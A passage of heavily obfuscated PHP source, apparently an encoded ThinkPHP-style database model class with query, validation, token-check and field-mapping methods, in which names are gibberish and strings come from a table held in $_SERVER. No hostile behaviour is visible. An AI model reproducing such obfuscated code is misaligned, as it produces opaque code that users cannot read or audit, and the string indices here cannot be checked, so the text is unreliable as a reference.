!empty($˜úÔ¡ÈÁ) && !isset($ï´‚­É´[$ŠëªŞ²Å[282]]) && !isset($ï´‚­É´[$ŠëªŞ²Å[279]])) { foreach ($ï´‚­É´[$ŠëªŞ²Å[275]] as $ôé‡ëÛí => $ÖŒ×¢µÅ) { $ôé‡ëÛí = trim($ôé‡ëÛí); if (in_array($ôé‡ëÛí, $˜úÔ¡ÈÁ, !0)) { if (is_scalar($ÖŒ×¢µÅ)) { $this->_parseType($ï´‚­É´[$ŠëªŞ²Å[275]], $ôé‡ëÛí); } } elseif (!is_numeric($ôé‡ëÛí) && $ŠëªŞ²Å[11] != substr($ôé‡ëÛí, 0, 1) && !1 === strpos($ôé‡ëÛí, $ŠëªŞ²Å[10]) && !1 === strpos($ôé‡ëÛí, $ŠëªŞ²Å[260]) && !1 === strpos($ôé‡ëÛí, $ŠëªŞ²Å[283]) && !1 === strpos($ôé‡ëÛí, $ŠëªŞ²Å[284])) { unset($ï´‚­É´[$ŠëªŞ²Å[275]][$ôé‡ëÛí]); } } } $this->_options_filter($ï´‚­É´); return $ï´‚­É´; } protected function _options_filter(&$¸ößƒƒ) { } protected function _parseType(&$ª°õÉï€, $çË¦÷Áê) { $¨«ïºµ£ =& $_SERVER[ÏéâËõ‘]; if (empty($this->options[$¨«ïºµ£[285]][$¨«ïºµ£[4] . $çË¦÷Áê])) { $ü§©Ùî« = strtolower($this->fields[$¨«ïºµ£[252]][$çË¦÷Áê]); if (!1 !== strpos($ü§©Ùî«, $¨«ïºµ£[286])) { } elseif (!1 === strpos($ü§©Ùî«, $¨«ïºµ£[287]) && !1 !== strpos($ü§©Ùî«, $¨«ïºµ£[288])) { $ª°õÉï€[$çË¦÷Áê] = intval($ª°õÉï€[$çË¦÷Áê]); } elseif (!1 !== strpos($ü§©Ùî«, $¨«ïºµ£[289]) || !1 !== strpos($ü§©Ùî«, $¨«ïºµ£[290])) { $ª°õÉï€[$çË¦÷Áê] = floatval($ª°õÉï€[$çË¦÷Áê]); } elseif (!1 !== strpos($ü§©Ùî«, $¨«ïºµ£[291])) { $ª°õÉï€[$çË¦÷Áê] = (bool) $ª°õÉï€[$çË¦÷Áê]; } } } public function find($Ó™°şÁ = array()) { $½»³—® =& $_SERVER[ÏéâËõ‘]; if (is_numeric($Ó™°şÁ) || is_string($Ó™°şÁ)) { $›µ­òì’[$this->getPk()] = intval($Ó™°şÁ); $this->options[$½»³—®[275]] = $›µ­òì’; } $this->options[$½»³—®[292]] = 1; $Ó™°şÁ = $this->_parseOptions(); $¹•Ğ’íÔ = $this->db->select($Ó™°şÁ); if (!1 === $¹•Ğ’íÔ) { return !1; } if (empty($¹•Ğ’íÔ)) { return null; } $this->data = $¹•Ğ’íÔ[0]; $this->_afterFind($this->data, $Ó™°şÁ); if (!empty($this->options[$½»³—®[293]])) { return $this->returnResult($this->data, $this->options[$½»³—®[293]]); } return $this->data; } protected function _afterFind(&$Æ®‘Å™, $»ô–Ê÷÷) { } protected function returnResult($î—ØÑéä, $©‡‹±† = '') { $Å² íãÇ =& $_SERVER[ÏéâËõ‘]; if ($©‡‹±†) { if (is_callable($©‡‹±†)) { return call_user_func($©‡‹±†, $î—ØÑéä); } switch (strtolower($©‡‹±†)) { case $Å² íãÇ[294]: return json_encode($î—ØÑéä); case $Å² íãÇ[295]: return xml_encode($î—ØÑéä); } } return $î—ØÑéä; } public function parseFieldsMap($çã¯ÓÆ¦, $šã˜·ç = 1) { if (!empty($this->_map)) { foreach ($this->_map as $·¢äæÄÅ => $æ¯ˆ„‡¥) { if ($šã˜·ç == 1) { if (isset($çã¯ÓÆ¦[$æ¯ˆ„‡¥])) { $çã¯ÓÆ¦[$·¢äæÄÅ] = $çã¯ÓÆ¦[$æ¯ˆ„‡¥]; unset($çã¯ÓÆ¦[$æ¯ˆ„‡¥]); } } else { if (isset($çã¯ÓÆ¦[$·¢äæÄÅ])) { $çã¯ÓÆ¦[$æ¯ˆ„‡¥] = $çã¯ÓÆ¦[$·¢äæÄÅ]; unset($çã¯ÓÆ¦[$·¢äæÄÅ]); } } } } return $çã¯ÓÆ¦; } public function setField($¬ˆ‡¯óã, $÷êÊÙÒÂ = '') { if (is_array($¬ˆ‡¯óã)) { $ı˜„Ùëí = $¬ˆ‡¯óã; } else { $ı˜„Ùëí[$¬ˆ‡¯óã] = $÷êÊÙÒÂ; } return $this->save($ı˜„Ùëí); } public function setAdd($®µŞ‰âİ, $„öà³Á = 1) { $ı¶³êŸì =& $_SERVER[ÏéâËõ‘]; $´‡÷Ôà™ = $®µŞ‰âİ . $ı¶³êŸì[296] . $„öà³Á; if ($„öà³Á < 0) { $´‡÷Ôà™ = $®µŞ‰âİ . $„öà³Á; } return $this->setField($®µŞ‰âİ, array($ı¶³êŸì[297], $´‡÷Ôà™)); } public function getField($•›¾ê…¢, $ÂÖã»’™ = null) { $Ù‚¥¹Ÿ¿ =& $_SERVER[ÏéâËõ‘]; $Æãµšæ[$Ù‚¥¹Ÿ¿[273]] = $•›¾ê…¢; $Æãµšæ = $this->_parseOptions($Æãµšæ); $•›¾ê…¢ = trim($•›¾ê…¢); if (strpos($•›¾ê…¢, $Ù‚¥¹Ÿ¿[50])) { if (!isset($Æãµšæ[$Ù‚¥¹Ÿ¿[292]])) { $Æãµšæ[$Ù‚¥¹Ÿ¿[292]] = is_numeric($ÂÖã»’™) ? $ÂÖã»’™ : $Ù‚¥¹Ÿ¿[12]; } $ßŸ = $this->db->select($Æãµšæ); if (!empty($ßŸ)) { $Ö¿Ş×ÉÀ = explode($Ù‚¥¹Ÿ¿[50], $•›¾ê…¢); $•›¾ê…¢ = array_keys($ßŸ[0]); $â­’ÔÎ = array_shift($•›¾ê…¢); $èÎÀßÃ„ = array_shift($•›¾ê…¢); $§°ˆâ­ª = array(); $»ÃšÄÔ¹ = count($Ö¿Ş×ÉÀ); foreach ($ßŸ as $ô¢²Ïó”) { $°èÑ–úŠ = $ô¢²Ïó”[$â­’ÔÎ]; if (2 == $»ÃšÄÔ¹) { $§°ˆâ­ª[$°èÑ–úŠ] = $ô¢²Ïó”[$èÎÀßÃ„]; } else { $§°ˆâ­ª[$°èÑ–úŠ] = is_string($ÂÖã»’™) ? implode($ÂÖã»’™, $ô¢²Ïó”) : $ô¢²Ïó”; } } return $§°ˆâ­ª; } } else { if (!0 !== $ÂÖã»’™) { $Æãµšæ[$Ù‚¥¹Ÿ¿[292]] = is_numeric($ÂÖã»’™) ? $ÂÖã»’™ : 1; } if ($ÂÖã»’™ === $Ù‚¥¹Ÿ¿[255]) { unset($Æãµšæ[$Ù‚¥¹Ÿ¿[292]]); } $ô¢²Ïó” = $this->db->select($Æãµšæ); if (!empty($ô¢²Ïó”)) { if ($ÂÖã»’™ === $Ù‚¥¹Ÿ¿[255]) { return reset($ô¢²Ïó”[0]); } if (!0 !== $ÂÖã»’™ && 1 == $Æãµšæ[$Ù‚¥¹Ÿ¿[292]]) { return reset($ô¢²Ïó”[0]); } foreach ($ô¢²Ïó” as $‘šë¢½–) { $¾ÂÊŸìã[] = $‘šë¢½–[$•›¾ê…¢]; } return $¾ÂÊŸìã; } } return null; } public function create($Ä¡³ šŒ = '', $ä¡¾Ôç = '') { $½Ï½Æ =& $_SERVER[ÏéâËõ‘]; if (empty($Ä¡³ šŒ)) { $Ä¡³ šŒ = $_POST; } elseif (is_object($Ä¡³ šŒ)) { $Ä¡³ šŒ = get_object_vars($Ä¡³ šŒ); } if (empty($Ä¡³ šŒ) || !is_array($Ä¡³ šŒ)) { $this->error = think_lang($½Ï½Æ[271]); return !1; } $Ä¡³ šŒ = $this->parseFieldsMap($Ä¡³ šŒ, 0); $ä¡¾Ôç = $ä¡¾Ôç ? $ä¡¾Ôç : (!empty($Ä¡³ šŒ[$this->getPk()]) ? THINK_MODEL_UPDATE : THINK_MODEL_INSERT); if (isset($this->options[$½Ï½Æ[273]])) { $Ãú…¨ïş = $this->options[$½Ï½Æ[273]]; unset($this->options[$½Ï½Æ[273]]); } elseif ($ä¡¾Ôç == THINK_MODEL_INSERT && isset($this->insertFields)) { $Ãú…¨ïş = $this->insertFields; } elseif ($ä¡¾Ôç == THINK_MODEL_UPDATE && isset($this->updateFields)) { $Ãú…¨ïş = $this->updateFields; } if (isset($Ãú…¨ïş)) { if (is_string($Ãú…¨ïş)) { $Ãú…¨ïş = explode($½Ï½Æ[50], $Ãú…¨ïş); } if (think_config($½Ï½Æ[298])) { $Ãú…¨ïş[] = think_config($½Ï½Æ[299]); } foreach ($Ä¡³ šŒ as $’ËÖõ¢ => $¨âú„•ó) { if (!in_array($’ËÖõ¢, $Ãú…¨ïş)) { unset($Ä¡³ šŒ[$’ËÖõ¢]); } } } if (!$this->autoValidation($Ä¡³ šŒ, $ä¡¾Ôç)) { return !1; } if (!$this->autoCheckToken($Ä¡³ šŒ)) { $this->error = think_lang($½Ï½Æ[300]); return !1; } if ($this->autoCheckFields) { $Ãú…¨ïş = $this->getDbFields(); foreach ($Ä¡³ šŒ as $’ËÖõ¢ => $¨âú„•ó) { if (!in_array($’ËÖõ¢, $Ãú…¨ïş)) { unset($Ä¡³ šŒ[$’ËÖõ¢]); } elseif (MAGIC_QUOTES_GPC && is_string($¨âú„•ó)) { $Ä¡³ šŒ[$’ËÖõ¢] = stripslashes($¨âú„•ó); } } } $this->autoOperation($Ä¡³ šŒ, $ä¡¾Ôç); $this->data = $Ä¡³ šŒ; return $Ä¡³ šŒ; } public function autoCheckToken($¥ì¢ÙÒ) { $ÏÎ¶íİ­ =& $_SERVER[ÏéâËõ‘]; if (isset($this->options[$ÏÎ¶íİ­[301]]) && !$this->options[$ÏÎ¶íİ­[301]]) { return !0; } if (think_config($ÏÎ¶íİ­[298])) { $ÁÏ¤Á = think_config($ÏÎ¶íİ­[299]); if (!isset($¥ì¢ÙÒ[$ÁÏ¤Á]) || Session::get($ÁÏ¤Á)) { return !1; } list($°¦½ìÑˆ, $ãƒşñÌã) = explode($ÏÎ¶íİ­[11], $¥ì¢ÙÒ[$ÁÏ¤Á]); if ($ãƒşñÌã && Session::get($ÁÏ¤Á . $ÏÎ¶íİ­[10] . $°¦½ìÑˆ) === $ãƒşñÌã) { Session::remove($ÁÏ¤Á . $ÏÎ¶íİ­[10] . $°¦½ìÑˆ); return !0; } if (think_config($ÏÎ¶íİ­[302])) { Session::remove($ÁÏ¤Á . $ÏÎ¶íİ­[10] . $°¦½ìÑˆ); } return !1; } return !0; } public function regex($°¯äµ‹İ, $»¦†¿¸) { $‡¬êÌ©° =& $_SERVER[ÏéâËõ‘]; $à§—‰Åà = array($‡¬êÌ©°[303] => $‡¬êÌ©°[304], $‡¬êÌ©°[305] => $‡¬êÌ©°[306], $‡¬êÌ©°[307] => $‡¬êÌ©°[308], $‡¬êÌ©°[309] => $‡¬êÌ©°[310], $‡¬êÌ©°[311] => $‡¬êÌ©°[312], $‡¬êÌ©°[313] => $‡¬êÌ©°[314], $‡¬êÌ©°[315] => $‡¬êÌ©°[316], $‡¬êÌ©°[290] => $‡¬êÌ©°[317], $‡¬êÌ©°[318] => $‡¬êÌ©°[319]); if (isset($à§—‰Åà[strtolower($»¦†¿¸)])) { $»¦†¿¸ = $à§—‰Åà[strtolower($»¦†¿¸)]; } return preg_match($»¦†¿¸, $°¯äµ‹İ) === 1; } private function autoOperation(&$»Û¨„Ø‚, $‰ßû¾ÄÀ) { $ü·İš×È =& $_SERVER[ÏéâËõ‘]; if (!empty($this->options[$ü·İš×È[320]])) { $¶âêÜİ = $this->options[$ü·İš×È[320]]; unset($this->options[$ü·İš×È[320]]); } elseif (!empty($this->_auto)) { $¶âêÜİ = $this->_auto; } if (isset($¶âêÜİ)) { foreach ($¶âêÜİ as $ßœ’Â³†) { if (empty($ßœ’Â³†[2])) { $ßœ’Â³†[2] = THINK_MODEL_INSERT; } if ($‰ßû¾ÄÀ == $ßœ’Â³†[2] || $ßœ’Â³†[2] == THINK_MODEL_BOTH) { switch (trim($ßœ’Â³†[3])) { case $ü·İš×È[321]: case $ü·İš×È[322]: $ä‚©§¡ = isset($ßœ’Â³†[4]) ? (array) $ßœ’Â³†[4] : array(); if (isset($»Û¨„Ø‚[$ßœ’Â³†[0]])) { array_unshift($ä‚©§¡, $»Û¨„Ø‚[$ßœ’Â³†[0]]); } if ($ü·İš×È[321] == $ßœ’Â³†[3]) { $»Û¨„Ø‚[$ßœ’Â³†[0]] = call_user_func_array($ßœ’Â³†[1], $ä‚©§¡); } else { $»Û¨„Ø‚[$ßœ’Â³†[0]] = call_user_func_array(array(&$this, $ßœ’Â³†[1]), $ä‚©§¡); } break; case $ü·İš×È[273]: $»Û¨„Ø‚[$ßœ’Â³†[0]] = $»Û¨„Ø‚[$ßœ’Â³†[1]]; break; case $ü·İš×È[323]: if ($ü·İš×È[12] === $»Û¨„Ø‚[$ßœ’Â³†[0]]) { unset($»Û¨„Ø‚[$ßœ’Â³†[0]]); } break; case $ü·İš×È[324]: default: $»Û¨„Ø‚[$ßœ’Â³†[0]] = $ßœ’Â³†[1]; } if (!1 === $»Û¨„Ø‚[$ßœ’Â³†[0]]) { unset($»Û¨„Ø‚[$ßœ’Â³†[0]]); } } } } return $»Û¨„Ø‚; } protected function autoValidation($Î°˜Ô¾‘, $Û¸û‡Ô£) { $¶‚éÆÓ† =& $_SERVER[ÏéâËõ‘]; if (!empty($this->options[$¶‚éÆÓ†[325]])) { $¦ç¶ÑËë = $this->options[$¶‚éÆÓ†[325]]; unset($this->options[$¶‚éÆÓ†[325]]); } elseif (!empty($this->_validate)) { $¦ç¶ÑËë = $this->_validate; } if (isset($¦ç¶ÑËë)) { if ($this->patchValidate) { $this->error = array(); } foreach ($¦ç¶ÑËë as $Íş°Í­­ => $µ®Ó¬Ñ) { if (empty($µ®Ó¬Ñ[5]) || $µ®Ó¬Ñ[5] == THINK_MODEL_BOTH || $µ®Ó¬Ñ[5] == $Û¸û‡Ô£) { if (0 == strpos($µ®Ó¬Ñ[2], $¶‚éÆÓ†[326]) && strpos($µ®Ó¬Ñ[2], $¶‚éÆÓ†[327])) { $µ®Ó¬Ñ[2] = think_lang(substr($µ®Ó¬Ñ[2], 2, -1)); } $µ®Ó¬Ñ[3] = isset($µ®Ó¬Ñ[3]) ? $µ®Ó¬Ñ[3] : THINK_EXISTS_VALIDATE; $µ®Ó¬Ñ[4] = isset($µ®Ó¬Ñ[4]) ? $µ®Ó¬Ñ[4] : $¶‚éÆÓ†[328]; switch ($µ®Ó¬Ñ[3]) { case THINK_MUST_VALIDATE: if (!1 === $this->_validationField($Î°˜Ô¾‘, $µ®Ó¬Ñ)) { return !1; } break; case THINK_VALUE_VALIDATE: if ($¶‚éÆÓ†[12] != trim($Î°˜Ô¾‘[$µ®Ó¬Ñ[0]])) { if (!1 === $this->_validationField($Î°˜Ô¾‘, $µ®Ó¬Ñ)) { return !1; } } break; default: if (isset($Î°˜Ô¾‘[$µ®Ó¬Ñ[0]])) { if (!1 === $this->_validationField($Î°˜Ô¾‘, $µ®Ó¬Ñ)) { return !1; } } } } } if (!empty($this->error)) { return !1; } } return !0; } protected function _validationField($¢ ‘ê„Á, $Â„ÍêÜ) { if (!1 === $this->_validationFieldItem($¢ ‘ê„Á, $Â„ÍêÜ)) { if ($this->patchValidate) { $this->error[$Â„ÍêÜ[0]] = $Â„ÍêÜ[2]; } else { $this->error = $Â„ÍêÜ[2]; return !1; } } return; } protected function _validationFieldItem($¾õ‚î†ò, $¬Ô²¬€å) { $Ì•½°Ó =& $_SERVER[ÏéâËõ‘]; switch (strtolower(trim($¬Ô²¬€å[4]))) { case $Ì•½°Ó[321]: case $Ì•½°Ó[322]: $Ôªï¼ªğ = isset($¬Ô²¬€å[6]) ? (array) $¬Ô²¬€å[6] : array(); if (is_string($¬Ô²¬€å[0]) && strpos($¬Ô²¬€å[0], $Ì•½°Ó[50])) { $¬Ô²¬€å[0] = explode($Ì•½°Ó[50], $¬Ô²¬€å[0]); } if (is_array($¬Ô²¬€å[0])) { foreach ($¬Ô²¬€å[0] as $»Î¶¹Ò¼) { $•…›—ºö[$»Î¶¹Ò¼] = $¾õ‚î†ò[$»Î¶¹Ò¼]; } array_unshift($Ôªï¼ªğ, $•…›—ºö); } else { array_unshift($Ôªï¼ªğ, $¾õ‚î†ò[$¬Ô²¬€å[0]]); } if ($Ì•½°Ó[321] == $¬Ô²¬€å[4]) { return call_user_func_array($¬Ô²¬€å[1], $Ôªï¼ªğ); } else { return call_user_func_array(array(&$this, $¬Ô²¬€å[1]), $Ôªï¼ªğ); } case $Ì•½°Ó[329]: return $¾õ‚î†ò[$¬Ô²¬€å[0]] == $¾õ‚î†ò[$¬Ô²¬€å[1]]; case $Ì•½°Ó[330]: if (is_string($¬Ô²¬€å[0]) && strpos($¬Ô²¬€å[0], $Ì•½°Ó[50])) { $¬Ô²¬€å[0] = explode($Ì•½°Ó[50], $¬Ô²¬€å[0]); } $îÅÔğºÂ = array(); if (is_array($¬Ô²¬€å[0])) { foreach ($¬Ô²¬€å[0] as $»Î¶¹Ò¼) { $îÅÔğºÂ[$»Î¶¹Ò¼] = $¾õ‚î†ò[$»Î¶¹Ò¼]; } } else { $îÅÔğºÂ[$¬Ô²¬€å[0]] = $¾õ‚î†ò[$¬Ô²¬€å[0]]; } if (!empty($¾õ‚î†ò[$this->getPk()])) { $îÅÔğºÂ[$this->getPk()] = array($Ì•½°Ó[331], $¾õ‚î†ò[$this->getPk()]); } if ($this->where($îÅÔğºÂ)->find()) { return !1; } return !0; default: return $this->check($¾õ‚î†ò[$¬Ô²¬€å[0]], $¬Ô²¬€å[1], $¬Ô²¬€å[4]); } } public function check($¸½ÅõÉ’, $£½ØšÏ, $â°åÛ°´ = "\x72\x65\147\x65\x78") { $ô½Ş°™ =& $_SERVER[ÏéâËõ‘]; $â°åÛ°´ = strtolower(trim($â°åÛ°´)); switch ($â°åÛ°´) { case $ô½Ş°™[7]: case $ô½Ş°™[332]: $¦±ªßöË = is_array($£½ØšÏ) ? $£½ØšÏ : explode($ô½Ş°™[50], $£½ØšÏ); return $â°åÛ°´ == $ô½Ş°™[7] ? in_array($¸½ÅõÉ’, $¦±ªßöË) : !in_array($¸½ÅõÉ’, $¦±ªßöË); case $ô½Ş°™[333]: case $ô½Ş°™[334]: if (is_array($£½ØšÏ)) { $²©â–†Ô = $£½ØšÏ[0]; $ãîÀğÅ = $£½ØšÏ[1]; } else { list($²©â–†Ô, $ãîÀğÅ) = explode($ô½Ş°™[50], $£½ØšÏ); } return $â°åÛ°´ == $ô½Ş°™[333] ? $¸½ÅõÉ’ >= $²©â–†Ô && $¸½ÅõÉ’ <= $ãîÀğÅ : $¸½ÅõÉ’ < $²©â–†Ô || $¸½ÅõÉ’ > $ãîÀğÅ; case $ô½Ş°™[335]: case $ô½Ş°™[336]: return $â°åÛ°´ == $ô½Ş°™[335] ? $¸½ÅõÉ’ == $£½ØšÏ : $¸½ÅõÉ’ != $£½ØšÏ; case $ô½Ş°™[337]: $˜Ë…Ê¯ = mb_strlen($¸½ÅõÉ’, $ô½Ş°™[338]); if (strpos($£½ØšÏ, $ô½Ş°™[50])) { list($²©â–†Ô, $ãîÀğÅ) = explode($ô½Ş°™[50], $£½ØšÏ); return $˜Ë…Ê¯ >= $²©â–†Ô && $˜Ë…Ê¯ <= $ãîÀğÅ; } else { return $˜Ë…Ê¯ == $£½ØšÏ; } case $ô½Ş°™[339]: list($«Î²Òî¼, $òü¨ÂÑ) = explode($ô½Ş°™[50], $£½ØšÏ); if (!is_numeric($«Î²Òî¼)) { $«Î²Òî¼ = strtotime($«Î²Òî¼); } if (!is_numeric($òü¨ÂÑ)) { $òü¨ÂÑ = strtotime($òü¨ÂÑ); } return NOW_TIME >= $«Î²Òî¼ && NOW_TIME <= $òü¨ÂÑ; case $ô½Ş°™[340]: return in_array(get_client_ip(), explode($ô½Ş°™[50], $£½ØšÏ)); case $ô½Ş°™[341]: return !in_array(get_client_ip(), explode($ô½Ş°™[50], $£½ØšÏ)); case $ô½Ş°™[328]: default: return $this->regex($¸½ÅõÉ’, $£½ØšÏ); } } public function query($€ÓÒ´Ğ, $î­èÑƒ÷ = false) { $“­®‰ïÖ =& $_SERVER[ÏéâËõ‘]; if (!is_bool($î­èÑƒ÷) && !is_array($î­èÑƒ÷)) { $î­èÑƒ÷ = func_get_args(); array_shift($î­èÑƒ÷); } $€ÓÒ´Ğ = str_replace(array($“­®‰ïÖ[231], $“­®‰ïÖ[342]), $“­®‰ïÖ[53], $€ÓÒ´Ğ); $€ÓÒ´Ğ = $this->parseSql($€ÓÒ´Ğ, $î­èÑƒ÷); return $this->db->query($€ÓÒ´Ğ); } public function execute($ÎÇ¾€ŒÓ, $çÈêîƒÌ = false) { if (!is_bool($çÈêîƒÌ) && !is_array($çÈêîƒÌ)) { $çÈêîƒÌ = func_get_args(); array_shift($çÈêîƒÌ); } $ÎÇ¾€ŒÓ = $this->parseSql($ÎÇ¾€ŒÓ, $çÈêîƒÌ); return $this->db->execute($ÎÇ¾€ŒÓ); } protected function parseSql($…Ìµ±êŞ, $‰»˜¼ü÷) { $‹¾§œÙ¿ =& $_SERVER[ÏéâËõ‘]; if (!0 === $‰»˜¼ü÷) { $«âÅ„åî = $this->_parseOptions(); $…Ìµ±êŞ = $this->db->parseSql($…Ìµ±êŞ, $«âÅ„åî); } elseif (is_array($‰»˜¼ü÷)) { $‰»˜¼ü÷ = array_map(array($this->db, $‹¾§œÙ¿[343]), $‰»˜¼ü÷); $…Ìµ±êŞ = vsprintf($…Ìµ±êŞ, $‰»˜¼ü÷); } else { $…Ìµ±êŞ = strtr($…Ìµ±êŞ, array($‹¾§œÙ¿[344] => $this->getTableName(), $‹¾§œÙ¿[345] => think_config($‹¾§œÙ¿[244]))); } $this->db->setModel($this->name); return $…Ìµ±êŞ; } public function db($À¾Ò˜óŒ = '', $ÚàÀí‰° = '', $³©â×àÇ = array()) { $ºÖü‰¦¦ =& $_SERVER[ÏéâËõ‘]; if ($ºÖü‰¦¦[12] === $À¾Ò˜óŒ && $this->db) { return $this->db; } static $¨’¼ÊÊĞ = array(); static $ß½¾¬è‹ = array(); if (!isset($ß½¾¬è‹[$À¾Ò˜óŒ]) || isset($ß½¾¬è‹[$À¾Ò˜óŒ]) && $ÚàÀí‰° && $¨’¼ÊÊĞ[$À¾Ò˜óŒ] != $ÚàÀí‰°) { if (!empty($ÚàÀí‰°) && is_string($ÚàÀí‰°) && !1 === strpos($ÚàÀí‰°, $ºÖü‰¦¦[8])) { $ÚàÀí‰° = think_config($ÚàÀí‰°); } $À¾Ò˜óŒ = think_guid($ÚàÀí‰°); $ß½¾¬è‹[$À¾Ò˜óŒ] = Db::getInstance($ÚàÀí‰°); } elseif (NULL === $ÚàÀí‰°) { $ß½¾¬è‹[$À¾Ò˜óŒ]->close(); unset($ß½¾¬è‹[$À¾Ò˜óŒ]); return; } if (!empty($³©â×àÇ)) { if (is_string($³©â×àÇ)) { parse_str($³©â×àÇ, $³©â×àÇ); } foreach ($³©â×àÇ as $–œ‡–ìÏ => $çêÓàœÇ) { $this->setProperty($–œ‡–ìÏ, $çêÓàœÇ); } } $¨’¼ÊÊĞ[$À¾Ò˜óŒ] = $ÚàÀí‰°; $this->db = $ß½¾¬è‹[$À¾Ò˜óŒ]; $this->_after_db(); if (!empty($this->name) && $this->autoCheckFields) { $this->_checkTableInfo(); } return $this; } protected function _after_db() { } public function getModelName() { if (empty($this->name)) { $™šúıÙ… = get_class($this); if ($™šúıÙ… == $_SERVER[ÏéâËõ‘][346]) { return $this->name; } $this->name = substr($™šúıÙ…, 0, -5); } return $this->name; } public function getTableName() { $ÑàŸ¡´ =& $_SERVER[ÏéâËõ‘]; if (empty($this->trueTableName)) { $×‡±¶ĞÚ = !empty($this->tablePrefix) ? $this->tablePrefix : $ÑàŸ¡´[12]; if (!empty($this->tableName)) { $×‡±¶ĞÚ .= $this->tableName; } else { $×‡±¶ĞÚ .= think_parse_name($this->name); } $this->trueTableName = strtolower($×‡±¶ĞÚ); } return (!empty($this->dbName) ? $this->dbName . $ÑàŸ¡´[10] : $ÑàŸ¡´[12]) . $this->trueTableName; } public function startTrans() { $this->commit(); $this->db->startTrans(); return; } public function commit() { return $this->db->commit(); } public function rollback() { return $this->db->rollback(); } public function getError() { return $this->error; } public function getDbError() { return $this->db->getError(); } public function getLastInsID() { return $this->db->getLastInsID(); } public function getLastSql() { return $this->db->getLastSql($this->name); } public function _sql() { return $this->getLastSql(); } public function getPk() { $³Ğ»ÄÎÕ =& $_SERVER[ÏéâËõ‘]; return isset($this->fields[$³Ğ»ÄÎÕ[251]]) ? $this->fields[$³Ğ»ÄÎÕ[251]] : $this->pk; } public function getDbFields() { $„¤ó–ó =& $_SERVER[ÏéâËõ‘]; if (isset($this->options[$„¤ó–ó[279]])) { $àî´ß¼ = $this->db->getFields($this->options[$„¤ó–ó[279]]); return $àî´ß¼ ? array_keys($àî´ß¼) : !1; } if ($this->fields) { $àî´ß¼ = $this->fields; unset($àî´ß¼[$„¤ó–ó[250]], $àî´ß¼[$„¤ó–ó[251]], $àî´ß¼[$„¤ó–ó[252]], $àî´ß¼[$„¤ó–ó[249]]); return $àî´ß¼; } return !1; } public function data($¹´¾Šö = '') { $–Æ¯Œœò =& $_SERVER[ÏéâËõ‘]; if ($–Æ¯Œœò[12] === $¹´¾Šö && !empty($this->data)) { return $this->data; } if (is_object($¹´¾Šö)) { $¹´¾Šö = get_object_vars($¹´¾Šö); } elseif (is_string($¹´¾Šö)) { parse_str($¹´¾Šö, $¹´¾Šö); } elseif (!is_array($¹´¾Šö)) { think_exception(think_lang($–Æ¯Œœò[271])); } $this->data = $¹´¾Šö; return $this; } public function join($‚ß««¿ø) { $ìŒ¥±€á =& $_SERVER[ÏéâËõ‘]; if (is_array($‚ß««¿ø)) { $this->options[$ìŒ¥±€á[282]] = $‚ß««¿ø; } elseif (!empty($‚ß««¿ø)) { $this->options[$ìŒ¥±€á[282]][] = $‚ß««¿ø; } return $this; } public function union($àä–Â÷, $ªÅ¦¯öŸ = false) { $Üğù¨êî =& $_SERVER[ÏéâËõ‘]; if (empty($àä–Â÷)) { return $this; } if ($ªÅ¦¯öŸ) { $this->options[$Üğù¨êî[347]][$Üğù¨êî[348]] = !0; } if (is_object($àä–Â÷)) { $àä–Â÷ = get_object_vars($àä–Â÷); } if (is_string($àä–Â÷)) { $å«ĞØéŠ = $àä–Â÷; } elseif (is_array($àä–Â÷)) { if (isset($àä–Â÷[0])) { $this->options[$Üğù¨êî[347]] = array_merge($this->options[$Üğù¨êî[347]], $àä–Â÷); return $this; } else { $å«ĞØéŠ = $àä–Â÷; } } else { think_exception(think_lang($Üğù¨êî[271])); } $this->options[$Üğù¨êî[347]][] = $å«ĞØéŠ; return $this; } public function cache($ÆÑöŠ ¦ = true, $ØÄ¥„Î† = null, $¬¤³ìàŞ = '') { $ğº®Şå‹ =& $_SERVER[ÏéâËõ‘]; if (!1 !== $ÆÑöŠ ¦) { $this->options[$ğº®Şå‹[349]] = array($ğº®Şå‹[94] => $ÆÑöŠ ¦, $ğº®Şå‹[339] => $ØÄ¥„Î†, $ğº®Şå‹[33] => $¬¤³ìàŞ); } return $this; } public function field($ƒÑÆü¹ø, $ßü¹ú¹× = false) { $ø½÷Ëèù =& $_SERVER[ÏéâËõ‘]; if (!0 === $ƒÑÆü¹ø) { $×å’ÃÅØ = $this->getDbFields(); $ƒÑÆü¹ø = $×å’ÃÅØ ? $×å’ÃÅØ : $ø½÷Ëèù[188]; } elseif ($ßü¹ú¹×) { if (is_string($ƒÑÆü¹ø)) { $ƒÑÆü¹ø = explode($ø½÷Ëèù[50], $ƒÑÆü¹ø); } $×å’ÃÅØ = $this->getDbFields(); $ƒÑÆü¹ø = $×å’ÃÅØ ? array_diff($×å’ÃÅØ, $ƒÑÆü¹ø) : $ƒÑÆü¹ø; } $this->options[$ø½÷Ëèù[273]] = $ƒÑÆü¹ø; return $this; } public function scope($¡È¼²¶Ü = '', $ˆ¡“†¨ = NULL) { $™¾éÇÃ½ =& $_SERVER[ÏéâËõ‘]; if ($™¾éÇÃ½[12] === $¡È¼²¶Ü) { if (isset($this->_scope[$™¾éÇÃ½[37]])) { $‹¡†ö€ö = $this->_scope[$™¾éÇÃ½[37]]; } else { return $this; } } elseif (is_string($¡È¼²¶Ü)) { $ƒ“ØñëÅ = explode($™¾éÇÃ½[50], $¡È¼²¶Ü); $‹¡†ö€ö = array(); foreach ($ƒ“ØñëÅ as $ªÖ½êı½) { if (!isset($this->_scope[$ªÖ½êı½])) { continue; } $‹¡†ö€ö = array_merge($‹¡†ö€ö, $this->_scope[$ªÖ½êı½]); } if (!empty($ˆ¡“†¨) && is_array($ˆ¡“†¨)) { $‹¡†ö€ö = array_merge($‹¡†ö€ö, $ˆ¡“†¨); } } elseif (is_array($¡È¼²¶Ü)) { $‹¡†ö€ö = $¡È¼²¶Ü; } if (is_array($‹¡†ö€ö) && !empty($‹¡†ö€ö)) { $this->options = array_merge($this->options, array_change_key_case($‹¡†ö€ö)); } return $this; } public function where($¥éñ÷ƒÏ, $ÎÂ£íçı = null) { $¨æØ¦¢„ =& $_SERVER[ÏéâËõ‘]; if (!is_null($ÎÂ£íçı) && is_string($¥éñ÷ƒÏ)) { if (!is_array($ÎÂ£íçı)) { $ÎÂ£íçı = func_get_args(); array_shift($ÎÂ£íçı); } $ÎÂ£íçı = array_map(array($this->db, $¨æØ¦¢„[343]), $ÎÂ£íçı); $¥éñ÷ƒÏ = vsprintf($¥éñ÷ƒÏ, $ÎÂ£íçı); } elseif (is_object($¥éñ÷ƒÏ)) { $¥éñ÷ƒÏ = get_object_vars($¥éñ÷ƒÏ); } elseif 